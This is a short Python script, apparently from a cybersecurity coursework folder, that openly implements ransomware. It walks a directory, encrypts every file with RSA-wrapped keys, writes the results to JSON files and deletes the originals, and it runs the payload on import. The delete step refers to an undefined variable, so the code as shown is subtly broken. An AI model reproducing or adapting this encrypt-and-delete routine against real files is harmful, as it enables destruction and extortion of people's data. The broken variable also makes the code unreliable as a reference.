
import os
from os import walk
import base64
import json
import rsaEncrypt as rsaEnc

def writeJSON( file, rootPath, publicKey ):
        #create file path using root path and file name
        filePath = rootPath + file
        
        jsonFile = os.path.splitext(file)[0]
        #get file contents after RSA encrypt
        RSACipher, ct, iv, tagByte, ext = rsaEnc.MyRSAEncrypt(filePath, publicKey)
        #storing contents in JSON file
        data = {}
        data['ciphertext'] = base64.b64encode(ct).decode('ascii')
        data['tag'] = base64.b64encode(tagByte).decode('ascii')
        data['iv'] = base64.b64encode(iv).decode('ascii')
        data['file_ext'] = ext
        data['RSACipher'] = base64.b64encode(RSACipher).decode('ascii')

        outputFile = jsonFile + '.json'

        #create JSONFile
        with open(rootPath + outputFile, 'w') as outFile:
                outFile.write(json.dumps(data))

        #Delete original file
        #if the filename is not our json file or pem file, then remove file
        if not filepath.endswith(('.json', '.pem')):
                os.remove(filepath)
        return outputFile

def payload():
        outputPath = "C:\\Users\\scuba.DESKTOP-6A9M5GB\\Documents\\cybersecurity\\Outputs\\Ransomware\\"
        #paths of public and private keys 
        publicKeyPath = "C:\\Users\\scuba.DESKTOP-6A9M5GB\\Documents\\cybersecurity\\Definitely-Not-Keys\\publicTransportation.pem"
        privateKeyPath = "C:\\Users\\scuba.DESKTOP-6A9M5GB\\Documents\\cybersecurity\\Definitely-Not-Keys\\privateTransportation.pem"
        #Ransomware. Select root path.
        rootPath = "C:\\Users\\scuba.DESKTOP-6A9M5GB\\Documents\\cybersecurity\\Outputs\\Ransomware\\"
        #get public key and private key from write key method
        publicKey, privateKey = rsaEnc.writeKeys(publicKeyPath, privateKeyPath)

        #for all the root, directories, and files in the walk
        for root, dirs, files in walk(rootPath):
        #absolute path
                root = (root +'\\')
                print(root)
        #for every file name in listed files
                for fName in files:
                        #create an output file by writing to JSON
                        outputFile = writeJSON(fName, root, publicKey)
                        print("TO JSON: "+ outputFile)
        print("encrypted.. to JSON")

payload()
